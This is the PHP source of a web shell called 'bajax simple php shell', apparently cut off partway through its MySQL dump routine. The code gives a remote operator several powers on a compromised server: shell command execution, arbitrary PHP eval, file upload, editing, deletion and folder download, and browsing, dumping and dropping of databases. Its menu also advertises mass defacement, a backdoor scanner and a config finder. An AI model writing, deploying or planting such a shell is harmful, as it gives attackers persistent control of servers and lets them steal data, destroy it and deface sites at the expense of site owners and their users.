<?php
/**
Name : bajax simple php shell
@author:wildantea
wildannudin@gmail.com

**/
error_reporting(0);
session_start();
@ini_set("max_execution_time",0);
ob_start();
class bajax {
	private $password="27c3448dbfbfedf5415f87cc5244016f";
	private $name="Bajax v1.0";
	private $datasec = array(); 
	private $ctrl_dir = array(); 
	private $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	private $old_offset = 0;
	private $find;
	private $ip;
private $favicon="iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA21JREFUeNqMVUsotGEUPmNmMBjMYAolhBIi15VQlI0oImShbFz2f3IpysbSksKCXLKQBVlIuRXKdeE25JZbjIzLuJ//nNM/Xxj/7z91mvf7vvd93vM+53neUQGA2dPT0+Ds7Aw2mw3e399BpVIBh4eHBzw+PoLVaoWvERAQAIgIT09P8uzm5gZnZ2fXGhqbMjIy9GVlZZCSkgJqtVpAePLw8LDk4uKibMLv7IuLioogMTERMjMz5VtfXx80NjZquZQrSqOrqyvk5ORAS0sLhIeHy8LU1FRYX18XQCcnJ6U6BuZNb25uoKurS4pob2/nTxb4A4j29PPzw+npaeTY3t7GkpIS/FvU19cjVYgf1l85AHL6+PjgzMyMLNrZ2cG1tTUHsP7+fiwuLkaq/mdATm9vb5yfn8eDgwMMDg7G5eVlBWxjYwOJb7y8vMSlpaX/A+Q0Go1I3CBxhAaDARcWFvDu7g6JaxwfH0dSBE5MTHwClKZ4eXkZAwMDwcXFRSRisViEdA6WBZMeFhYGOp1OxhcXFxAZGQm8hhszNDQE8fHxsLq6apHW3d7eysKQkBBIS0sTjbEG29rapOsvLy9QUVEhG25tbUFVVRVkZ2dDb2+vSCc9PR3o+PD29gaKFljQrC+uUK/XQ2xsLHR2dsom/v7+Ut3h4aFIiisymUxA3MLk5CQUFBSAVqsVHDXlL3KKjpog+jo5OYHT01NxjdlshuPjY6l4c3NT3rNeqetwdHQk4FNTU0Dyko13d3dtirDhm6ipqYGsrCzIzc0F4hkGBwchKChIsRz/UsehtLTUvsSigX8EHyM6OlrGTH5DQwOMjo4C6RQ+UvU1vpVNQkIC0hGxsrIS8/PzlfcxMTFINCianJub+1mH7u7u4pDy8nIknvD19RWrq6s/gRKHAjg7O/sz4MDAAHZ3d8s4Li5OqaapqUmZExUVhdRAXFlZ+TdgXV0djo2NIfEnz0lJSZ88zM6xz42IiMCOjg5Hp3CX+YJl0ukGEQns7+8Lwb6+vpCXl6cQTseXjicnJ0unyZ7Q2toKxKVyfVlpAY6MjCA5Bs/Pz7Gnpwdra2sxNDTUoVmFhYXiaQJDsife39/j3t4eNjc3IznJyhWa6Q6Uv4CHhwepgpoCGo1GPGt/x8GXLPv3+flZ0h48l21JnF7/FmAA22tszHkUqewAAAAASUVORK5CYII=";
	function header()
	{
		// favicon
	if(isset($_GET['fav'])){
	$data=base64_decode($this->favicon);
	header("Content-type:image/png");
	header("Cache-control:public");
	echo $data;
	exit;
}
		$r='';
		$r.="<!DOCTYPE html><head><title>$this->name</title>";
		$r.='<link rel="SHORTCUT ICON" type="image/png" href="'.$_SERVER['SCRIPT_NAME'].'?fav" />';
		$r.="<style type='text/css'>
		body {
			background:#222;
			font-family:Tahoma,Verdana;
			color:#fff;
			font-size:12px;
		}
		#wrapper {
			border:thin #f00;
		margin:10px auto;
			padding:20px;
			border-radius:10px 10px;
			box-shadow: inset 0 0 10px #f00;
			background:#010107;
		}
		#head {
			
			border-bottom:thin solid #f00;
			padding:7px;
			line-height:1.3em;
		}
		#menu{border-bottom: 1px solid #f00; padding: 5px; text-align: center; margin-bottom:15px;}
#menu a{padding: 7px 10px; color: #fff; font-size: 13px; font-weight:bold;font-family: arial; text-decoration: none; }
#menu a:hover{color: #f00; text-decoration:none;-moz-border-radius:4px;-webkit-border-radius:4px;}
		#center{
			border:1px solid #f00;
			font-size:12px;
			padding:10px;
			-moz-border-radius:10px;
			-webkit-border-radius:10px;
			-border-radius:10px;
			text-align:center;

		}
		#center table {
			width:100%;
			font-size:12px;
			margin:0 auto;
			
		}
		#center td {
			border-bottom:1px solid #f00;
			padding:5px;
			margin-bottom:10px;
		}


		#center #input {
			border:1px solid #f00;
			width:400px;
			border:1px solid #f00;
			-moz-border-radius:3px;
			-webkit-border-radius:3px;
			background:#000;
			color:#fff;padding:3px;
			margin-left:10px;
		}
		#center #input:hover {
			background-color:#f00;
		}
		#center #cmd {
			width:700px;
			border:1px solid #f00;
			-moz-border-radius:3px;
			-webkit-border-radius:3px;
			background:#000;
			color:#fff;padding:3px;
		}
		#center #cmd:hover {
			background:#f00;
		}
		#center #pos {
			border-bottom:1px solid #f00;
			text-align:center;
			padding:5px;
		}
		#pos textarea {
			height:100px;
			width:500px;
			margin:5px 0 5px 0;
			resize:none;
		}

		#isi {
			border:1px solid #f00;
			-moz-border-radius:10px;
			-webkit-border-radius:10px;
			-border-radius:10px;
			margin:10px auto;
			padding:10px;
			color:#fff;
			padding-bottom:15px;
			line-height:1.5em;
		}
		#see {
			border:1px solid #f00;
			-moz-border-radius:10px;
			-webkit-border-radius:10px;
			-border-radius:10px;
			margin:10px auto;
			padding:10px;
			padding-right:15px;
			color:#fff;
			padding-bottom:15px;
			line-height:1.5em;
			overflow-x:scroll;
	}
		#isi textarea {
			line-height:1.5em;
			border:none;
			background:#000;
			width:100%;
			height:300px;
			margin-bottom:10px;
			font-size:12px;
			color:#fff;
			border-bottom:1px solid #f00;
			resize:none;
		}
		#isi input:hover {
			color:#f00;
		}
		#footer {
			font-size:12px;
			text-align:center;
		}
		.xpltab {
	font-size:11px;
	color:#fff;
	font-family:Tahoma,Verdana,Arial;

	border-right:thin solid #f00;


}
.xpltab th {
	background-color: #f00;
	padding:4px;
	opacity:50%;
	border:thin solid #000;
	border-left:thin solid #f00;
	border-right:thin solid #000;
}
.xpltab th:hover {
	color:#fff;
}
.xpltab td {
	border-bottom:thin solid #f00;
	border-left:thin solid #f00;
	padding:5px;
}
a:link,a:active,a:visited {
	text-decoration:none;
	color:#f00;
}
#box {
	border:1px solid #f00;
			width:200px;
			border:1px solid #f00;
			-moz-border-radius:3px;
			-webkit-border-radius:3px;
			background:#000;
			color:#fff;padding:3px;
			margin-left:7px;
			margin-right:7px;
}
.tengah {
	margin:0 auto;
	display:block;
	font-size:14px;
}
hr {
	line-color:#f00;
}
#but:hover {
	background-color: #f00;
		}
#but {
	height:25px;
	background:#222;
	color:#fff;
	padding:3px;
	width:70px;
	border-radius:4px;
	-moz-border-radius:4px;
	-webkit-border-radius:4px;
	border:none;
	margin-left:7px;
}
#but:active {
	position:relative;
	top:1px;
		}
#col {
	margin-left:7px;
	float:left;
	line-height:2.4em;

	
}
#val{
	margin-left:20px;
	float-right;
	margin-bottom:7px;
}
#sqlbox {

	border:1px solid #f00;
	width:1000px;
	border:1px solid #f00;
	-moz-border-radius:3px;
	-webkit-border-radius:3px;
	background:#000;
	color:#fff;padding:3px;
	margin-left:7px;
	margin-right:7px;
}
.gede {
	font-size:20px;
	margin:0 auto;
	color:#f00;
}
		</style></head><body><div id='wrapper'><div id='head'>
		".php_uname()."<br />".$_SERVER['SERVER_SOFTWARE']."<br />".get_current_user()."<br />Server Ip : ".gethostbyname($_SERVER['HTTP_HOST'])."<br />Your IP : ".$_SERVER['REMOTE_ADDR']."<br />".$this->drive()."</div>";

		return $r;
	}
	function dir()
	  {
			if(isset($_GET['dir']))
		{
			 $dir =$_GET['dir'];
			if(is_dir($dir)){
				chdir($dir);
				//$dir = $d;
				return $dir;
				
			}
		 }
		 else {
			//return realpath(isset($_GET['dir'])).DIRECTORY_SEPARATOR;
			return getcwd().DIRECTORY_SEPARATOR;
		}
	  }
	function menu ()
	{
		 //options menu
		$r='';
		$menu=array("[ Files ]"=>"?act=file&dir=".$this->dir()."", "[ Mysql ]"=>"?act=mysql&dir=".$this->dir()."","Info.Ser"=>"?act=ser&dir=".$this->dir()."", "Encoder"=>"?act=encode&dir=".$this->dir()."", "Writable Dir"=>"?act=write&dir=".$this->dir()."","BD Scanner"=>"?act=bds&dir=".$this->dir()."","Mass Deface"=>"?act=md&dir=".$this->dir(),"Config Finder"=>"?act=loc&dir=".$this->dir(),"Logout"=>"?act=out");
		$r.="<div id='menu'>";
		foreach($menu as $val=>$key){
		$r.="<a href='$key'>$val</a>";
		}
		
		$r.= "</div>";
		return $r;
	}
	//create new directory
	function mkdir()
	{
		if(!empty($_POST['dir']))
		{
			if(mkdir($this->replace($this->dir()).$_POST['dir']))
			return "created, Refresh Please";else return "Permission Denied";
		}
	}
	function center()
	{
		$r='';
		$r.='<div id="center"><div id="pos"><form method="post" action="?act=cmd&dir='.$this->dir().'">Command <input type="hidden" name="action" value="command"><input type="text" id="cmd" name="cmd" value=""><input type="submit" id="but" name="submit" value="Execute"></form></div><br /><div id="pos"><form method="post" action="?act=eval&dir='.$this->dir().'">PHP Eval <br /><input type="hidden" name="action" value="eval"><textarea placeholder="//don\'t include php tag" id="cmd" name="eval"></textarea><br /><input type="submit" id="but" name="submit" value="Execute"></form></div><form method="post" action="?act=file&dir='.$this->dir().'"><table><tr><td>Create Directory : <input type="hidden" name="action" value="mkdir"><input type="text" id="input" placeholder="mydir" name="dir"><input type="submit" id="but" name="submit" value="Create"></form></td><td><form method="post" action="?act=file&dir='.$this->dir().'">Create File : <input type="hidden" name="action" value="createfile"><input type="text" placeholder="sample.txt" id="input" name="file" value=""><input type="submit" id="but" name="submit" value="Create"></form></td></tr></table>

		<div id="pos"><form method="post" action="?act=file&dir='.$this->dir().'" enctype="multipart/form-data"><input type="hidden" name="action" value="uploader">Upload File <p /> Save To <input type="text" id="input" name="tujuan" value="'.$this->dir().'"><br /><input type="file" name="berkas"><input type="submit" name="submit id="but" value="upload"></form></div></div>';
		return $r;
	}
	function execution($r)
	  {
		if(function_exists('system'))
		{
			ob_start();
			system($r);
			$s=ob_get_contents();
			ob_end_clean();
			return $s;
		}
		elseif(function_exists('passthru'))
		{
			ob_start();
			passthru($r);
			$s=ob_get_contents();
			ob_clean();
			return $s;
		}
		elseif(function_exists('exec'))
		{
			$s='';
			exec($r,$h);
			foreach ($h as $hasil) {
				$s.=$hasil;
			}
			return $s;
		}
		elseif(function_exists('shell_exec'))
		{
			$s=shell_exec($r);
			return $s;
		}
		return "All function Disable";
	  }
	
	//output command 
	function command()
	{
		$r='';
		$r.='<div id="isi">';
		if(!empty($_POST['cmd']))
		{
		$r.="<pre>".$this->execution($_POST['cmd'])."</pre>";
		$r.="</div>";
		}
		else $r.=header("location:?act=file&dir=".$this->dir());
		return $r;
	}
	function seval($c)
	{
		ob_start();
		eval($c.";");
		$h=ob_get_contents();
		ob_end_clean();
		return $h;
	}
	function phpeval()
	{
		$r='';
		$r.='<div id="isi">';
		if(isset($_POST['submit'])&&!empty($_POST['eval']))
		{
			$r.=htmlspecialchars($this->seval($_POST['eval']));
		}
		else $r.=header("location:?act=file&dir=".$this->dir());
		$r.='</div>';
		return $r;

	}
	function upload()
	{
		if(!empty($_FILES['berkas']))
		{
			$dest=$this->replace($_POST['tujuan']);
			$name=$dest.$_FILES['berkas']['name'];
			if(move_uploaded_file($_FILES['berkas']['tmp_name'],$name))
			return $this->alert("uploaded");else return $this->alert("failed");
		}
	}
	function createfile()
	{
		if(!empty($_POST['file']))
		if(file_exists($this->replace($this->dir.$_POST['file'])))
		return $this->alert("file has exist");
		$fp=fopen($this->replace($this->dir.$_POST['file']),"w");
		if($fp)
		{
			fclose($fp);
			return $this->alert("file Created");
		}
	}
	function footer()
	{
		$r='';
		$r.="</div></div><div id='footer'>Copy Left Bajax ".date("Y")."</div>";
		return $r;

	}
	function logo()
	{
		$r='';
		$r.="<pre><center>
   Barudak jaringan komputer 

</pre></center></div>";
	return $r;
	}
	//go up directory
		function up($d){
			$s=DIRECTORY_SEPARATOR;
			$d=explode($s,$d);
			array_pop($d);
			array_pop($d);
			$r=implode($d,$s).DIRECTORY_SEPARATOR;
			return $r;
		}
	  
	function getsize($s)
		{
			if(!$s) return 0;
			if($s>=1073741824) return(round($s/1073741824,2)." GB");
			elseif($s>=1048576) return(round($s/1048576,2)." MB");
			elseif($s>=1024) return(round($s/1024,2)." KB");
			else return($s." B");
		}
	 function deleteDirectory($dir) {
		if (!file_exists($dir)) return true;
		if (!is_dir($dir) || is_link($dir)) return unlink($dir);
		foreach (scandir($dir) as $item) {
		if ($item == '.' || $item == '..') continue;
		if (!$this->deleteDirectory($dir . "/" . $item)) {
		chmod($dir . "/" . $item, 0777);
		if (!$this->deleteDirectory($dir . "/" . $item)) return false;
		};}return rmdir($dir);}

		function replace($dir)
		{
			return str_replace('\\','/', $dir);
		}
	   //remove file or folder
		function remdir()
		{
				if(is_writable($_REQUEST['file']))
				{
				$dir=$_GET['file'];
				$this->deleteDirectory($dir); 
				}
				else{echo "Permission Denied !";}
		 }
		 function remfile()
		 {
			$file=$_GET['file'];
			if(is_file($file)){
			unlink($file);
			}else{$this->alert("Permission Denied");}
		 }
		 function editfile($file)
		 {
			if(!empty($_POST['rename']))
			{
				rename($_POST['file'],$_POST['rename']);
			}
			$fp=fopen($_POST['rename'],'w');
			if(!$fp)return 0;
			fwrite($fp, stripslashes($_POST['isi']));
			fclose($fp);return 1;

		 }
		 //rename file to new name
		 function rename($file)
		 {
			if(!empty($_POST['rename']))
			{
				if(rename($_POST['file'],$_POST['rename']));
				return 1;return 0;
			}
		 }

function add_dir($name)
{
$name = str_replace("\\", "/", $name);
$fr = "\x50\x4b\x03\x04";
$fr .= "\x0a\x00";
$fr .= "\x00\x00";
$fr .= "\x00\x00";
$fr .= "\x00\x00\x00\x00";
$fr .= pack("V",0);
$fr .= pack("V",0);
$fr .= pack("V",0);
$fr .= pack("v", strlen($name) ); 
$fr .= pack("v", 0 );
$fr .= $name;
$fr .= pack("V",$crc); 
$fr .= pack("V",$c_len); 
$fr .= pack("V",$unc_len);
$this -> datasec[] = $fr;
$new_offset = strlen(implode("", $this->datasec));
$cdrec = "\x50\x4b\x01\x02";
$cdrec .="\x00\x00"; 
$cdrec .="\x0a\x00"; 
$cdrec .="\x00\x00"; 
$cdrec .="\x00\x00"; 
$cdrec .="\x00\x00\x00\x00"; 
$cdrec .= pack("V",0); 
$cdrec .= pack("V",0); 
$cdrec .= pack("V",0); 
$cdrec .= pack("v", strlen($name) );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$ext = "\x00\x00\x10\x00";
$ext = "\xff\xff\xff\xff";
$cdrec .= pack("V", 16 );
$cdrec .= pack("V", $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function add_file($data, $name)
{
$name = str_replace("\\", "/", $name);
$fr = "\x50\x4b\x03\x04";
$fr .= "\x14\x00";
$fr .= "\x00\x00";
$fr .= "\x08\x00"; 
$fr .= "\x00\x00\x00\x00";
$unc_len = strlen($data);
$crc = crc32($data);
$zdata = gzcompress($data);
$zdata = substr( substr($zdata, 0, strlen($zdata) - 4), 2);
$c_len = strlen($zdata);
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len);
$fr .= pack("V",$unc_len);
$fr .= pack("v", strlen($name) );
$fr .= pack("v", 0 );
$fr .= $name;
$fr .= $zdata;
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len); 
$fr .= pack("V",$unc_len); 
$this -> datasec[] = $fr;
$new_offset = strlen(implode("", $this->datasec));
$cdrec = "\x50\x4b\x01\x02";
$cdrec .="\x00\x00";
$cdrec .="\x14\x00"; 
$cdrec .="\x00\x00";
$cdrec .="\x08\x00";
$cdrec .="\x00\x00\x00\x00"; 
$cdrec .= pack("V",$crc); 
$cdrec .= pack("V",$c_len); 
$cdrec .= pack("V",$unc_len); 
$cdrec .= pack("v", strlen($name) );
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("V", 32 ); 
$cdrec .= pack("V", $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function file() { 
$data = implode("", $this -> datasec);
$ctrldir = implode("", $this -> ctrl_dir);
return
$data.
$ctrldir.
$this -> eof_ctrl_dir.
pack("v", sizeof($this -> ctrl_dir)).
pack("v", sizeof($this -> ctrl_dir)). 
pack("V", strlen($ctrldir)). 
pack("V", strlen($data)). 
"\x00\x00";
}
function get_files_from_folder($directory, $put_into) 
	{
		$sp=DIRECTORY_SEPARATOR;
		if ($handle = opendir($directory)) {

		while (false !== ($file = readdir($handle))) {
				if (is_file($directory.$file)) {
				$fileContents = file_get_contents($directory.$file);
				$this->add_file($fileContents, $put_into.$file);
											}
			 	elseif ($file != '.' and $file != '..' and is_dir($directory.$file)) 
			 	{
				$this->add_dir($put_into.$file.$sp);
				$this->get_files_from_folder($directory.$file.$sp, $put_into.$file.$sp);
				}
													}
											}
				closedir($handle);
	}
//download folder into zip
function downloadfolder($fd)
{
	$this->get_files_from_folder($fd,'');
	header("Content-Disposition: attachment; filename=" .$this->cs(basename($fd))."-".".zip");   
	header("Content-Type: application/download");
	header("Content-Length: " . strlen($this -> file()));
	flush();
	echo $this -> file(); 
	exit();
}

function cs($t){
	return str_replace(" ","_",$t);
}
//converter
function convert($isi)
	{
		$i=$_POST['convert'];
		switch ($isi) {
			case 'md5':$c=md5($i);return $c;break;
			case 'hexa':$c=bin2hex($i);return $c;break;
			case '64en':$c=base64_encode($i);return $c;break;
			case '64de':$c=base64_decode($i);return $c;break;
			case 'sha1':$c=sha1($i);return $c;break;
			case 'urlen':$c=urlencode($i);return $c;break;
			case 'urlde':$c=urldecode($i);return $c;break;
		}
	}    
	//current location 
	function current($f)
	{
		$d=explode(DIRECTORY_SEPARATOR, $this->dir());
				$s='';
				$r='';
				for ($i=0; $i <count($d); $i++) { 
					$s.=$d[$i].DIRECTORY_SEPARATOR;
					($i==count($d)-1?$r.="<a href='?act=$f&dir=".$s."'>$d[$i]</a>":$r.="<a href='?act=$f&dir=".$s."'>$d[$i]".DIRECTORY_SEPARATOR."</a>");
				}
				return $r;
	}
	//explorer
	function xpl()
		{
			// define an array to hold the files
			$dname=array();
			$fname=array();
						if ($dh=opendir($this->dir()))
			{
				while(false !==($name=readdir($dh))){
					if($name !='.'){
					(is_dir($name))?$dname[]=$name:$fname[]=$name;
				}    
				}
				closedir($dh);
		}
		sort($dname);
		sort($fname);
			
			$r="<center>Current Location : <br />".$this->current('file');
				
			$r.="</center><div id='isi'><table border=0 style='width:100%' cellspacing=0 class='xpltab'><tr><th style='width:50%;'>Name</th><th style='width:70px;'>Size</th><th style='width:100px;'>Owner : Group</th><th style='width:80px;'>Permission</th><th style='width:50px;'>Writable</th><th style='100px;'>Modified</th><th>Action</th>";
						foreach( $dname as $folder )
			{   
				$own=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($this->dir().$folder)):"0";
				$group=function_exists('posix_getpwuid')?posix_getpwuid(filegroup($this->dir().$folder)):"0";
				$owner=$own['name'].":".$group['name'];
				$write=is_writable($this->dir().$folder)?"Yes":"No";
				if($folder =='..')
				{
					$pwd=$this->up($this->dir());
					$r .="<tr><td><a href='?act=file&dir=$pwd'>$folder </a></td><td>LINK</td><td>$owner</td><td>".substr(sprintf('%o', fileperms($this->dir().$folder)),-3)."</td><td>$write</td><td>".date("d-M-Y H:i",filemtime($this->dir().$folder))."</td></tr>";
			  
				} else {
					$d=$this->dir();
				$r .="<tr><td><a href='?act=file&dir=$d$folder".DIRECTORY_SEPARATOR."'>$folder /</a></td><td>DIR</td><td>$owner</td><td>".(is_readable($folder)?substr(sprintf('%o', fileperms($d.$folder.DIRECTORY_SEPARATOR)),-3):'Forbidden')."</td><td>$write</td><td>".date("d-M-Y H:i",filemtime($d.$folder.DIRECTORY_SEPARATOR))."</td><td><a href='?act=ren&dir=$d&file=$folder'>Ren</a> | <a href='?act=file&act3=del&dir=$d&file=$d$folder'>Del</a> | <a href='?act=downfolder&file=".$d.$folder.DIRECTORY_SEPARATOR."'>Download</a></td></tr>";
			  }
			}
			foreach($fname as $file)
			{
				
				$own=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($this->dir().$file)):"0";
				$group=function_exists('posix_getpwuid')?posix_getpwuid(filegroup($this->dir().$file)):"0";
				$owner=$own['name'].":".$group['name'];
				$write=is_writable($this->dir().$file)?"Yes":"No";
				$d=$this->dir();
				$r .="<tr><td><a href='?act=lihat&dir=$d&file=$d$file'>$file</a></td><td>".$this->getSize(filesize($file))."</td><td>$owner</td><td>".(is_readable($file)?substr(sprintf('%o', fileperms($file)),-3):'forbidden')."</td><td>$write</td><td>".date("d-M-Y H:i",filemtime($file))."</td><td><a href='?act=edit&dir=$d&file=$file'>Edit</a> | <a href='?act=ren&dir=$d&file=$file'>Ren</a> | <a href='?act=file&act2=del&dir=$d&file=".$this->replace($d.$file)."'>Del</a> | <a href='?act=down&file=".$this->replace($d.$file)."'>Download</a></td></tr>";
			}
			$r .= "</table></div>";
			return $r;

		}

		//edit file form 
		function edit($file)
		{
			$d=$this->dir();
		$fp = fopen($file,'r');
		if (!$fp)
		 return false;
		$r = '';
		$r .= '<div id="isi"><form action="?act=file&dir='.$d.'&file='.$file.'" method="post"><input type="hidden" name="action" value="editfile">' 
			   .'<input type="hidden" name="file" value="'.$file.'"><tr>';
		 $r .= '<textarea name="isi">'.(htmlspecialchars(fread($fp, filesize($file)))).'</textarea><br />';
		 $r .= '<span style="color:#fff;margin-right:5px;text-align:center">Rename : </span><input type="text" name="rename" value="'.$file.'" style="width:800px;border:1px solid #f00;-moz-border-radius:3px;-webkit-border-radius:3px;background:#000;color:#fff;padding:3px;"></span> <br /><input type="submit" id="but" value="Save" /></td></tr>';
		 $r .= '</form></div>';
		 fclose($fp);
		 return $r;
		}
		//rename file form
		function ren($file)
		{
			$d=$this->dir();
			$fp=fopen($file,'r');
			if(!$fp)return false;
			$r='';
			$r.="<div id='isi'><form action='?act=file&dir=".$d."' method='post'>";
			$r.='<input type="hidden" name="action" value="renamed">';
			$r.='<center><input type="text" name="file" value="'.$file.'" style="width:400px;border:1px solid #f00;-moz-border-radius:3px;-webkit-border-radius:3px;background:#000;color:#fff;padding:3px;"> To <input type="text" name="rename" style="width:400px;border:1px solid #f00;-moz-border-radius:3px;-webkit-border-radius:3px;background:#000;color:#fff;padding:3px;"></center><br /><input type="submit" id="but" value="Rename"></form></div>';
			fclose($fp);
			return $r;
		}
		//alert when something happen
		function alert($text)
		{
			$r="<script>alert('".$text."');</script>";
			return $r;
		}
		
		function downloadfile($f)
		{
			//$file=$this->strips($f);
			$fl=file_get_contents($f);
			header("Content-type:application/octet-stream");
			header("Content-length:".strlen($fl));
			header("Content-Disposition:attachment;filename=".$this->cs(basename($f)));
			echo $fl;
			exit;
		}
		function login()
	{
		if(!isset($_SESSION['login'])&&!isset($_POST['masuk']))
		{
			$r='';
			$r.= '<div id="center"><form method="post" action="?act=mysql">Host : <input id="box" type="text" name="host" value="localhost">Username :<input type="text" name="user" id="box" value="root">Password <input type="text" id="box" name="pass"><input type="number" id="box" value="3306" name="port"><input type="submit" value="login" name="masuk" id="but"></div></form>';
			return $r;
		} 
		elseif(!isset($_SESSION['login'])&&isset($_POST['masuk']))
		{
			extract($_POST);
			 $this->con=mysql_connect($host.":".$port,$user,$pass) or die(header("location:?act=mysql"));
			  $_SESSION['host']=$_POST['host'];
			  $_SESSION['port']=$_POST['port'];
			  $_SESSION['user']=$_POST['user'];
			  $_SESSION['pass']=$_POST['pass'];
			  $_SESSION['login']=true;

		 
			header("location:?act=view&dir=".$this->dir()."");
		}
			else header("location:?act=view&dir=".$this->dir()."");

		

	}
	//connect with session created
	function connector()
	{
		extract($_SESSION);
		$c=mysql_connect($host.":".$port,$user,$pass);
		return $c;
	}
	//end session
	function logout()
	{
		extract($_SESSION);
		return "<center>$user@$host <a href='?act=logout'>Logout</a></center>";
	}
	//free d query load
	function free($re)
	{
		return mysql_free_result($re);
	}
	//query mysql
	function qe($q)
	{
		return mysql_query($q);
	}
	//show databases list
	function lihatdb()
	{
			$c=$this->connector();
			if($c)
			{
			$r='';
			$r.=$this->logout();
			$r.="<div id='isi'><table width=50% align='center' cellspacing=0  class='xpltab'><tr><th>Database</th><th>Table count</th><th>Download</th><th>Drop</th></tr>";
			$list=mysql_list_dbs($c);
			while($isi=mysql_fetch_assoc($list))
			{
				$tbl=$this->qe("SHOW TABLES FROM $isi[Database]");
				$tbl_count=mysql_num_rows($tbl);
				$r.= "<tr><td><a href='?act=showtable&db=$isi[Database]'>$isi[Database]</td><td>$tbl_count</td><td><a href='?act=downdb&db=$isi[Database]'>Download</a></td><td><a href='?act=dropdb&db=$isi[Database]'>Drop</a></td></tr>";
			}
			$r.= "</table></br><center><form action='?act=mysql' method='post'>New database <input type='text' value='new_db' name='dbname' id='box'><input type='hidden' name='action' value='createdb'><input type='submit' value='create' id='but'></form></center>";
			$r.=$this->sqlcommand()."</div>";
			$this->free($tbl);
			}
			else {
				session_destroy();
				$r.="gagal brow";
			}
			mysql_close($c);
			return $r;
	}
	//show table list from selected database
	function showtable()
	{
		$c=$this->connector();
		$r='';
			$r.=$this->logout();
			$r.="<div id='isi'>
			<center><a href='?act=mysql'>Show Database</a></center><br />
			<table width=50% align='center' class='xpltab' cellspacing=0 ><tr><th style='border-left:thin solid #f00;'>Table</th><th>Column count</th><th>Dump</th><th>Drop</th></tr>";
			$db=$_GET['db'];
			$query=$this->qe("SHOW TABLES FROM $db");
			while($data=mysql_fetch_array($query))
			{

				$iml=$this->qe("SHOW COLUMNS FROM $db.$data[0]");
				$h=(mysql_num_rows($iml))?mysql_num_rows($iml):0;
				$r.= "<tr><td><a href='?act=showcon&db=$db&table=$data[0]'>$data[0]</td><td>$h</td><td><a href='?act=downdb&db=$db&table=$data[0]'>Dump</a></td><td><a href='?act=dropdb&db=$db&tbl=$data[0]'>Drop</a></td></tr>";
				
			}
			
			$r.= "</table>".$this->sqlcommand()."</div>";
			return $r;
			$this->free($query);
			$this->free($iml);
			mysql_close($c);
	}
	//show all content from table selected
	function showcon()
	{
		$c=$this->connector();
		$r='';
			$r.=$this->logout();
			 $db=$_GET['db'];
			$tbl=$_GET['table'];
			$r.="<div id='isi'>
			<center><a href='?act=showtable&db=$db'>Show Tables </a></center><br />
			<table width=100% align='center' cellspacing=0 class='xpltab'><tr>";
		   
			$query=$this->qe("SELECT * FROM $db.$tbl");
			$col=array();
			$iml=$this->qe("SHOW COLUMNS FROM $db.$tbl");
				$r.="<tr>";
				while ($c=mysql_fetch_assoc($iml)) {
					array_push($col,$c['Field']);
						$r.="<th style='border:thin solid #000;'>".strtoupper($c['Field'])."</th>";
				}
				$r.="<th>Action</th></tr>";
			while($data=mysql_fetch_row($query))
			{
				$cols=mysql_fetch_row($iml);

				$r.="<tr>";
				foreach ($data as $da) {
					$r.="<td style='border-right:thin solid #f00;'>".$da."</td>";
				}

				$r.="<td><a href='?act=editrow&db=$db&table=$tbl&col=$col[0]&val=$data[0]'>Edit</a> | <a href='?act=delrow&db=$db&table=$tbl&col=$col[0]&val=$data[0]'>Delete</a>";
				
				$r.="</td></tr>";
			}
			$r.= "</table><br /><center><a href='?act=insertrow&db=$db&table=$tbl'><input type='button' id='but' value='Insert Row'></a></center>".$this->sqlcommand()."</div>";
		   $this->free($query);
		   $this->free($iml);
			return $r;
	}
	function downdb()
	{
		$c=$this->connector();
		//downloading specific table
		
		if (isset($_GET['db'])&&isset($_GET['table'])) {
			$db=$_GET['db'];
			$tbl=$_GET['table'];
			$r="-- =========================mysql Dumper bajax =============================\n-- Database $db\n-- Table Name : $tbl\n\n";
			$tab=$this->qe("SELECT * FROM $db.$tbl");
				$query2=$this->qe("SHOW COLUMNS FROM $db.$tbl");
				$r.="CREATE TABLE IF NOT EXISTS `$tbl` (\n";
				for($i=0;$i<mysql_num_rows($query2)-1;$i++)
				{
					$result=mysql_fetch_array($query2);	
					$r.='`'.$result[0].'` '.$result[1].($result[2]=='NO'&&$result[4]!='NULL'?' NOT NULL ':' DEFAULT NULL').strtoupper($result[5]).($result[5]==true?" PRIMARY KEY":'').(reset($result)?',':'')."\n";
				} 
				$result=mysql_fetch_array($query2);
				$r.='`'.$result[0].'` '.$result[1].($result[2]=='NO'&&$result[4]!='NULL'?' NOT NULL ':' DEFAULT NULL').strtoupper($result[5]).($result[5]==true?" PRIMARY KEY":'')."\n";
				$r.=");\n";
				$select=$this->qe("SELECT * FROM $db.$tbl");
				while($data=mysql_fetch_assoc($select))
				{
					$col=implode(', ',array_keys($data));
					$val=implode("', '",array_values($data));
						$r.="INSERT INTO  `$tbl` ($col) VALUES ('$val');\n";
				}
				$r.="\n";
		}
		//downloading database 
		elseif(isset($_GET['db'])&&!isset($_GET['tbl']))
		{
			$db=$_GET['db'];
			$tables=array();
			$column=array();
			$r='';
			$r.="-- =========================Bajax Mysql Dumper  =============================\n-- Database : `$db`\n\n";
			$query=$this->qe("SHOW TABLES FROM $db");
			
			while($list=mysql_fetch_array($query))
			$tables[]=$list[0];
			foreach ($tables as $d) {
				//well i spend more time here :D
				$query2=$this->qe("SHOW COLUMNS FROM $db.$d");
				$r.="CREATE TABLE IF NOT EXISTS `$d` (\n";
				for($i=0;$i<mysql_num_rows($query2)-1;$i++)
				{

					$result=mysql_fetch_array($query2);
					
